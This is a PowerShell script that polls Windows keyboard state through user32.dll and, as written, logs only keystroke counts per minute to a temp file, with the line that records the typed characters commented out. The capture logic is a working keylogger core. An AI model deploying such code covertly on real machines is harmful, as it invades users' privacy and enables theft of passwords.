function Test-KeyLogger($logPath="$env:temp\test_keylogger.txt") 
{
  # API declaration
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
    
  # output file
  $no_output = New-Item -Path $logPath -ItemType File -Force
  $interval = 60
  try
  {
    Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red
    [System.IO.File]::AppendAllText($logPath, "key`ttime`tcount`r`n", [System.Text.Encoding]::Unicode)
    $endtime = get-date
    while ($true) {
      Start-Sleep -Milliseconds 40
      $starttime = get-date
      $i = 0
      $flag = $true
      while ($flag) {
        for ($ascii = 9; $ascii -le 254; $ascii++) {
          # get key state
          $keystate = $API::GetAsyncKeyState($ascii)
          # if key pressed
          if ($keystate -eq -32767) {
            $null = [console]::CapsLock
            # translate code
            $virtualKey = $API::MapVirtualKey($ascii, 3)
            # get keyboard state and create stringbuilder
            $kbstate = New-Object Byte[] 256
            $checkkbstate = $API::GetKeyboardState($kbstate)
            $loggedchar = New-Object -TypeName System.Text.StringBuilder
            # translate virtual key          
            if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0)) 
            {
              #if success, add key to logger file
              # [System.IO.File]::AppendAllText($logPath, $loggedchar, [System.Text.Encoding]::Unicode) 
              $i = $i + 1
            }
          }
          $endtime = get-date
          $secondstosleep = [int]($interval - ($endtime - $starttime).TotalSeconds)
          if($secondstosleep -le 0){
            $flag = $false
          } 
        }
      }
      [System.IO.File]::AppendAllText($logPath, "`t" + $endtime.ToString("yyyy/MM/dd HH:mm"), [System.Text.Encoding]::Unicode)
      [System.IO.File]::AppendAllText($logPath, "`t" + $i, [System.Text.Encoding]::Unicode) 
      [System.IO.File]::AppendAllText($logPath, "`r`n", [System.Text.Encoding]::Unicode)
      $i = 0
    }
  }
  finally
  { 
    [System.IO.File]::AppendAllText($logPath, "`t" + $endtime.ToString("yyyy/MM/dd HH:mm"), [System.Text.Encoding]::Unicode)
    [System.IO.File]::AppendAllText($logPath, "`t" + $i + "`r`n", [System.Text.Encoding]::Unicode) 
    notepad $logPath
  }
}
Test-KeyLogger
